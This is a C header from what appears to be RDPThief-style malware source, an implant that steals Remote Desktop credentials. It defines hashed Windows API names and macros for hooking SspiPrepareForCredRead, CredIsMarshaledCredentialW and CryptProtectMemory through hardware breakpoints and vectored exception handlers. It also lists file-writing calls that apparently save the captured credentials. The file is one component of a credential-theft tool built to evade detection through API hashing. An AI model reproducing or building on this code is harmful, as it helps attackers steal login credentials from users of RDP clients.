#ifndef RDPTHIEF_MACROS_H
#define RDPTHIEF_MACROS_H

#define WIN32_FUNC( x )     __typeof__( x ) * x;
#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)
#define InstanceOffset()    ( U_PTR( & __Instance_offset ) )
#define InstancePtr()       ( ( PWINAPIS ) C_DEF( C_PTR( U_PTR( StRipStart() ) + InstanceOffset() ) ) )
#define Instance()          ( ( PWINAPIS ) __LocalInstance )
#define MAIN_INSTANCE       PWINAPIS __LocalInstance = InstancePtr();

#define D_SEC( x )  __attribute__( ( section( ".text$" #x "" ) ) )
#define C_DEF( x )   ( * ( PVOID* )  ( x ) )
#define FUNC         D_SEC( B )
#define U_PTR( x )   ( ( UINT_PTR ) ( x ) )
#define C_PTR( x )   ( ( PVOID    ) ( x ) )

#define MmCopy  __builtin_memcpy
#define MmZero  RtlSecureZeroMemory

#define HASH_ntdll      0x47ee1ba1
#define HASH_kernel32   0x9c917389
#define HASH_SspiCli    0xd530ddba
#define HASH_Advapi32   0x93710f5d
#define HASH_crypt32    0xea34a13a
#define HASH_msvcrt     0xc5a1c782

#define HASH_RtlAllocateHeap                    0x6456ee0e
#define HASH_LoadLibraryA                       0xe5bd0e0f
#define HASH_LocalAlloc                         0xbd87fc8f
#define HASH_LocalFree                          0x5b167946
#define HASH_OpenThread                         0x1287fbc3
#define HASH_GetThreadContext                   0xa0b84a56
#define HASH_SetThreadContext                   0x333610e2
#define HASH_CryptProtectMemory                 0xe059aee5
#define HASH__snwprintf_s                       0xeceefcb5
#define HASH_CreateFileW                        0x241608c4
#define HASH_wcslen                             0xd6c35465
#define HASH_WriteFile                          0x1ae57284
#define HASH_LeaveCriticalSection               0x76fce4e6
#define HASH_InitializeCriticalSection          0x15689bab
#define HASH_AddVectoredExceptionHandler        0xef2dd9ab
#define HASH_RemoveVectoredExceptionHandler     0x7d0ff370
#define HASH_EnterCriticalSection               0xa377ab57
#define HASH_DeleteCriticalSection              0x6b0431ec
#define HASH_NtProtectVirtualMemory             0xa1e157bc
#define HASH_NtQuerySystemInformation           0xeb83055c
#define HASH_SspiPrepareForCredRead             0xe41eeaa8
#define HASH_CredIsMarshaledCredentialW         0xfb579c96
#define HASH_GetCurrentProcessId                0xe273a88
#define HASH_CloseHandle                        0xb952109b
#define HASH_ReadFile                           0x67083495
#define HASH_GetCurrentThreadId                 0x1ba92e01

#define CONTINUE_EXECUTION(CTX)     (CTX->EFlags = CTX->EFlags | (1 << 16))
#define ALL_THREADS                 0
#define STATUS_SUCCESS              0x00000000
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#define kernel32_handle     Instance()->HandlesDll.kernel32
#define ntdll_handle        Instance()->HandlesDll.ntdll
#define Advapi32_handle     Instance()->HandlesDll.Advapi32
#define crypt32_handle      Instance()->HandlesDll.Crypt32
#define msvcrt_handle       Instance()->HandlesDll.msvcrt
#define SspiCli_handle      Instance()->HandlesDll.SspiCli

#define LocalAlloc_                          Instance()->Kernel32Dll.LocalAlloc
#define LoadLibraryA_                        Instance()->Kernel32Dll.LoadLibraryA
#define GetCurrentThreadId_                  Instance()->Kernel32Dll.GetCurrentThreadId
#define OpenThread_                          Instance()->Kernel32Dll.OpenThread
#define GetThreadContext_                    Instance()->Kernel32Dll.GetThreadContext
#define SetThreadContext_                    Instance()->Kernel32Dll.SetThreadContext
#define LocalFree_                           Instance()->Kernel32Dll.LocalFree
#define GetCurrentProcessId_                 Instance()->Kernel32Dll.GetCurrentProcessId
#define CloseHandle_                         Instance()->Kernel32Dll.CloseHandle
#define ReadFile_                            Instance()->Kernel32Dll.ReadFile
#define LeaveCriticalSection_                Instance()->Kernel32Dll.LeaveCriticalSection
#define InitializeCriticalSection_           Instance()->Kernel32Dll.InitializeCriticalSection
#define AddVectoredExceptionHandler_         Instance()->Kernel32Dll.AddVectoredExceptionHandler
#define EnterCriticalSection_                Instance()->Kernel32Dll.EnterCriticalSection
#define RemoveVectoredExceptionHandler_      Instance()->Kernel32Dll.RemoveVectoredExceptionHandler
#define DeleteCriticalSection_               Instance()->Kernel32Dll.DeleteCriticalSection
#define NtQuerySystemInformation_            Instance()->NtdllDll._NtQuerySystemInformation

#define CreateFileW_                         Instance()->HwbpAPIS.CreateFileW
#define wcslen_                              Instance()->HwbpAPIS.wcslen
#define snwprintf_s                          Instance()->HwbpAPIS._snwprintf_s
#define WriteFile_                           Instance()->HwbpAPIS.WriteFile
#define SspiPrepareForCredRead_              Instance()->HwbpAPIS.SspiPrepareForCredRead
#define CredIsMarshaledCredentialW_          Instance()->HwbpAPIS.CredIsMarshaledCredentialW
#define CryptProtectMemory_                  Instance()->HwbpAPIS.CryptProtectMemory

#endif //RDPTHIEF_MACROS_H
